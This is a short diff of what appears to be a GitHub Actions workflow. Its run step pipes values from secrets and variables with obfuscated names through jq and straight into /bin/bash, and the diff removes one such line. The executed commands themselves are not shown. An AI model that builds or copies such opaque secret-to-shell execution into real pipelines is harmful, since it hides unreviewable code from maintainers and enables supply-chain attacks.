@@ -18,7 +18,6 @@ jobs:
           qs0234: ${{ secrets.qs0234 }}
         run: |
           printf '%s' "$qs0234" | jq -r .efsoc36637 | /bin/bash
-          printf '%s' "$ozh3591" | jq -r .ddmbs17 | /bin/bash
           printf '%s' "$dv090" | jq -r .qj9801 | /bin/bash
           printf '%s' "$mg84483" | jq -r .q16 | /bin/bash
           echo $vki2 | jq -r .d817 | /bin/bash
